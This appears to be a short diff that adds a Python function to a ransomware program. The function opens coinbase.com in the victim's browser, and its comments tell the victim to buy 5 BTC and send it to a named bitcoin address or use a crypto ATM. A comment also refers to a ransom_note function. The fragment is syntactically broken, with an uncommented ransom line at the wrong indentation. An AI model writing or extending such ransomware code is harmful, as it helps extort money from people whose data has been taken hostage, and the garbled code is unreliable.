@@ -1,0 +1,11 @@
+# Goes to coinbase.com
+# We want them to sign up and purchase bitcoin
+# Add account info into ransom_note function
+    def what_is_bitcoin():
+        url = 'https://www.coinbase.com/'
+        # Open browser to the https://coinbase so they know what to use. 
+        #To pay the ransom, go to coinbase.com and make an account. Then purchase 5BTC and send to bc1qsqfxwh40x3n4ddw28jsry8j0azhfl7nh6yyrsy
+Alternatively, go to your nearest crypto ATM and follow instructions to send 5BTC to bc1qsqfxwh40x3n4ddw28jsry8j0azhfl7nh6yyrsy
+
+
+        webbrowser.open(url)
